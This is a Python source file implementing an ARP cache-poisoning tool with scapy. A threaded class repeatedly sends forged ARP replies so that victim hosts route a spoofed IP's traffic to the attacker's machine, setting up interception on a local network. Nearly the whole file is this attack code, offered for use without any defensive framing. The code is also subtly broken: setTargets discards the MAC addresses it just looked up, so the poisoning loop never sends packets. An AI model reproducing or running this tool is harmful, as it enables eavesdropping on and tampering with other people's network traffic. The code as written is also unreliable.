from scapy.all import ARP, send, Ether, srp, get_if_hwaddr
import threading
import time

class ARPPoisoner:
    def __init__(self, log):
        # State if poisoner
        self.running = False
        self.pause_event = threading.Event()
        self.stop_event = threading.Event()
        self.log = log

    def setTargets(self, targets: list[tuple[str, str]]):
        """Set targets, requires list of tuples of target ip and spoof ip"""
        self.targets = []

        for (target_ip, spoof_ip) in targets:
            target_mac_address = self.findMacAddress(target_ip)
            target = [target_ip, spoof_ip, target_mac_address]
            self.targets.append(target)
        self.targets = targets

    def setInterface(self, iface):
        """Set the network network"""
        self.iface = iface
        self.macsrc = get_if_hwaddr(iface)

    def findMacAddress(self, ip):
        # Create ARP request packet
        request = ARP(pdst=ip)
        broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
        packet = broadcast / request

        # Send the ARP packet and receive the response
        result = srp(packet, iface=self.iface, timeout=1, verbose=False)[0]
        return result[0][1].hwsrc if result else None

    def arp_poison_loop(self):
        """
        Continuous ARP reply sender:
          - `psrc`: spoofed fake IP
          - `pdst`: victim target IP
        Loops until `stop_event` is set, respects `pause_event`.
        """
        while self.running and not self.stop_event.is_set():
            if self.pause_event.is_set():
                time.sleep(0.1)
                continue

            for index, target_packet in enumerate(self.targets):
                # Check whether the mac address was found
                if len(target_packet) < 3:
                    self.log(f"Mac Address not found for target {index+1}.")
                    time.sleep(1)
                    continue

                # Construct ARP reply: "spoof_ip is-at [our MAC]" to target
                target_ip, spoof_ip, hwdst = target_packet
                arp_resp = ARP(
                    op=2,             # is-at (ARP reply)
                    pdst=target_ip,   # who we're poisoning
                    psrc=spoof_ip,    # pretend to be the spoof ip
                    hwsrc=self.macsrc,# mac address for network interface
                    hwdst=hwdst       # mac address for target
                )
                send(arp_resp, iface=self.iface, verbose=0)
                self.log(f"Sent ARP reply: {spoof_ip} is-at <us> → {target_ip}")

            # Wait a bit before next round to keep cache poisoned
            time.sleep(2)

    def start(self):
        if self.running:
            return
        self.running = True

        if self.stop_event.is_set():
            self.stop_event.clear()

        threading.Thread(
            target=self.arp_poison_loop,
            args=(),
            daemon=True
        ).start()

    def pause(self):
        if (self.pause_event.is_set()):
            self.pause_event.clear()
        else:
            self.pause_event.set()
            

    def stop(self):
        if (not self.stop_event.is_set()):
            self.stop_event.set()